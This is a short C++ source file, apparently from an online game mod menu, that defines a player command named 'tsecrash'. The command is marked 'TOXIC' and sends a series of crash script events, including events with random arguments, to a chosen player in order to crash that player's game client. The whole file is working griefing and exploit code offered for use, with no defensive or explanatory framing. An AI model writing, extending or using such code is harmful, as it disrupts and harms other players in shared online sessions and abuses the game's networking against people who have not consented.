#include "backend/player_command.hpp"
#include "pointers.hpp"
#include "core/enums.hpp"

namespace big
{
	class tsecrash : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level()
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const std::vector<std::uint64_t>& _args, const std::shared_ptr<command_context> ctx)
		{
			int64_t args1[] = { (int64_t)eRemoteEvent::Crash, (int64_t)self::id };
			g_pointers->m_trigger_script_event(1, args1, sizeof(args1) / sizeof(args1[0]), 1 << player->id());

			int64_t args2[] = { (int64_t)eRemoteEvent::Crash2, (int64_t)self::id, rand() % INT64_MAX };
			g_pointers->m_trigger_script_event(1, args2, sizeof(args2) / sizeof(args2[0]), 1 << player->id());

			int64_t args3[] = { (int64_t)eRemoteEvent::MCTeleport, (int64_t)self::id, rand() % INT64_MAX, rand() % INT64_MAX };
			g_pointers->m_trigger_script_event(1, args3, sizeof(args3) / sizeof(args3[0]), 1 << player->id());
		}
	};

	tsecrash g_tsecrash("tsecrash", "TSE Crash", "Sends crash script events.", 0);
}